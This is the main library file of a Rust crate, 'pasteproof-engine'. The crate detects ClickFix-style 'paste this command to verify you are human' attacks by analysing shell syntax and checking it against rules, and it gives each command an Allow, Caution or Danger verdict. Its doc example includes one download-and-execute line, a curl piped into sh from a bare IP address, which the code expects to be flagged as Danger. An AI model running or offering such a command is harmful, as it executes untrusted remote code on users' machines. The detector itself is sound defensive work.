//! # pasteproof-engine
//!
//! Detects ClickFix-style "paste this command to verify you are human"
//! attacks in a single command line, before it runs.
//!
//! * No I/O, no network, no unsafe code, no runtime dependencies.
//! * Shell-aware: understands pipes, `$(...)`, `<(...)`, quoting, `-c`
//!   strings, PowerShell `-EncodedCommand`, base64 layers and more.
//! * Rules are data (`rules/*.toml`), compiled into the binary at build time.
//!
//! ```
//! use pasteproof_engine::{analyze, Options, Verdict};
//! let r = analyze("echo hello", &Options::default());
//! assert_eq!(r.verdict, Verdict::Allow);
//! let r = analyze("curl -fsSL https://198.51.100.7/x | sh", &Options::default());
//! assert_eq!(r.verdict, Verdict::Danger);
//! ```

#![forbid(unsafe_code)]
#![deny(missing_docs)]

mod analyze;
mod decode;
mod json;
mod lex;
mod normalize;
mod text;
mod url;

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

/// Overall decision for a command.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Verdict {
    /// Nothing risky found.
    Allow,
    /// Risky but common in legitimate use (e.g. an official installer).
    Caution,
    /// Strongly resembles an attack.
    Danger,
}

impl Verdict {
    /// Lowercase name: `allow`, `caution` or `danger`.
    pub fn as_str(self) -> &'static str {
        match self {
            Verdict::Allow => "allow",
            Verdict::Caution => "caution",
            Verdict::Danger => "danger",
        }
    }
}

/// A compiled detection rule. See `rules/*.toml`.
#[derive(Debug)]
pub struct Rule {
    /// Stable identifier, e.g. `PP001`.
    pub id: &'static str,
    /// Short plain-language title.
    pub title: &'static str,
    /// Verdict this rule produces when it matches.
    pub severity: Verdict,
    /// Contribution to the 0-100 score.
    pub score: u32,
    /// Every one of these signal bits must be present.
    pub all: u64,
    /// At least one of these signal bits must be present (if non-zero).
    pub any: u64,
    /// None of these signal bits may be present.
    pub none: u64,
    /// At least one of these lowercase substrings must appear (if non-empty).
    pub match_any: &'static [&'static str],
    /// Suppressed when every URL in the command is on the user's allowlist.
    pub allowlistable: bool,
    /// Platforms the rule is written for (informational).
    pub platforms: &'static [&'static str],
    /// Plain-language explanation; may contain `{host}`, `{tool}`, `{spaces}`.
    pub explain: &'static str,
    /// What the user should do.
    pub advice: &'static str,
    /// Links to background material.
    pub references: &'static [&'static str],
}

/// Which syntax to expect. `Auto` works for almost everything.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub enum Dialect {
    /// Detect from the command itself.
    #[default]
    Auto,
    /// POSIX shells: sh, bash, zsh (fish is close enough).
    Posix,
    /// Windows PowerShell / PowerShell 7.
    PowerShell,
    /// Windows cmd.exe / Run dialog.
    Cmd,
}

/// Analysis options.
#[derive(Clone, Copy, Debug, Default)]
pub struct Options<'a> {
    /// The text was pasted rather than typed (raises the `pasted` signal).
    pub pasted: bool,
    /// Expected syntax.
    pub dialect: Dialect,
    /// Trusted origins such as `https://sh.rustup.rs` or bare hosts such as
    /// `sh.rustup.rs`. Rules marked `allowlistable` are suppressed when every
    /// URL in the command matches one of these exactly.
    pub allow_origins: &'a [&'a str],
}

/// Largest input analysed. Longer input is truncated and flagged.
pub const MAX_INPUT: usize = 64 * 1024;

/// Result of analysing one command.
#[derive(Debug, Clone)]
pub struct Report {
    /// Overall decision.
    pub verdict: Verdict,
    /// 0-100, higher is riskier.
    pub score: u32,
    /// Bitset of raised signals (see [`SIGNALS`]).
    pub signals: u64,
    /// Rules that matched, most severe first.
    pub matched: Vec<&'static Rule>,
    /// URLs found (including inside decoded content).
    pub urls: Vec<String>,
    /// Content that was hidden or encoded, revealed (truncated).
    pub hidden: Vec<String>,
    /// The most suspicious host, if any.
    pub host: Option<String>,
    /// Built-in tool abused, if any (e.g. `mshta`).
    pub tool: Option<&'static str>,
    /// Longest run of padding spaces that hides later content.
    pub padding: usize,
    /// Input was longer than [`MAX_INPUT`] and was truncated.
    pub truncated: bool,
    /// Allowlisted rules were suppressed.
    pub allowlisted: bool,
}

impl Report {
    /// True if `signal` (a bit from [`sig`]) was raised.
    pub fn has(&self, signal: u64) -> bool {
        self.signals & signal != 0
    }

    /// Names of all raised signals.
    pub fn signal_names(&self) -> Vec<&'static str> {
        SIGNALS
            .iter()
            .filter(|(_, _, b)| self.signals & b != 0)
            .map(|(n, _, _)| *n)
            .collect()
    }

    /// Plain-language sentences explaining the verdict, most severe first,
    /// without duplicates.
    pub fn explanations(&self) -> Vec<String> {
        let mut out: Vec<String> = Vec::new();
        // Only the rules that decided the verdict; milder ones add noise.
        for r in self.matched.iter().filter(|r| r.severity == self.verdict) {
            let s = self.fill(r.explain);
            if !out.contains(&s) {
                out.push(s);
            }
        }
        out
    }

    /// Advice lines from matched rules, without duplicates.
    pub fn advice(&self) -> Vec<&'static str> {
        let mut out: Vec<&'static str> = Vec::new();
        for r in self.matched.iter().filter(|r| r.severity == self.verdict) {
            if !r.advice.is_empty() && !out.contains(&r.advice) {
                out.push(r.advice);
            }
        }
        out
    }

    fn fill(&self, t: &str) -> String {
        if !t.contains('{') {
            return t.to_string();
        }
        t.replace("{host}", self.host.as_deref().unwrap_or("the internet"))
            .replace("{tool}", self.tool.unwrap_or("a built-in Windows program"))
            .replace("{spaces}", &self.padding.to_string())
    }

    /// Machine-readable JSON (stable field names, no external dependencies).
    pub fn to_json(&self) -> String {
        json::report(self)
    }
}

/// Analyse one command line (possibly multi-line) and return a [`Report`].
///
/// Pure function: no I/O, deterministic, bounded time and memory.
pub fn analyze(input: &str, opts: &Options<'_>) -> Report {
    let (input, truncated) = if input.len() > MAX_INPUT {
        let mut end = MAX_INPUT;
        while !input.is_char_boundary(end) {
            end -= 1;
        }
        (&input[..end], true)
    } else {
        (input, false)
    };

    let mut ctx = analyze::Ctx::new(opts.dialect);
    analyze::analyze_text(&mut ctx, input, 0, opts.dialect);
    ctx.finish();

    let mut signals = ctx.signals;
    if opts.pasted {
        signals |= sig::PASTED;
    }
    if input.trim_end_matches(['\n', '\r']).contains('\n') {
        signals |= sig::MULTILINE;
    }
    if truncated || input.len() > 4096 {
        signals |= sig::OVERSIZED;
    }

    let allowlisted = !opts.allow_origins.is_empty()
        && !ctx.urls.is_empty()
        && ctx
            .urls
            .iter()
            .all(|u| url::origin_allowed(u, opts.allow_origins));

    let mut matched: Vec<&'static Rule> = RULES
        .iter()
        .filter(|r| rule_matches(r, signals, &ctx.haystack))
        .filter(|r| !(allowlisted && r.allowlistable))
        .collect();
    matched.sort_by(|a, b| b.severity.cmp(&a.severity).then(b.score.cmp(&a.score)));

    let verdict = matched.first().map_or(Verdict::Allow, |r| r.severity);
    let score = matched.iter().map(|r| r.score).sum::<u32>().min(100);

    Report {
        verdict,
        score,
        signals,
        matched,
        urls: ctx.urls,
        hidden: ctx.hidden,
        host: ctx.host,
        tool: ctx.tool,
        padding: ctx.padding,
        truncated,
        allowlisted: allowlisted
            && RULES
                .iter()
                .any(|r| r.allowlistable && rule_matches(r, signals, "")),
    }
}

#[inline]
fn rule_matches(r: &Rule, signals: u64, haystack: &str) -> bool {
    if signals & r.all != r.all {
        return false;
    }
    if r.any != 0 && signals & r.any == 0 {
        return false;
    }
    if signals & r.none != 0 {
        return false;
    }
    if !r.match_any.is_empty() && !r.match_any.iter().any(|m| haystack.contains(m)) {
        return false;
    }
    true
}

/// Look up a signal's bit by name (e.g. `"download_exec"`).
pub fn signal_bit(name: &str) -> Option<u64> {
    SIGNALS
        .iter()
        .find(|(n, _, _)| *n == name)
        .map(|(_, _, b)| *b)
}
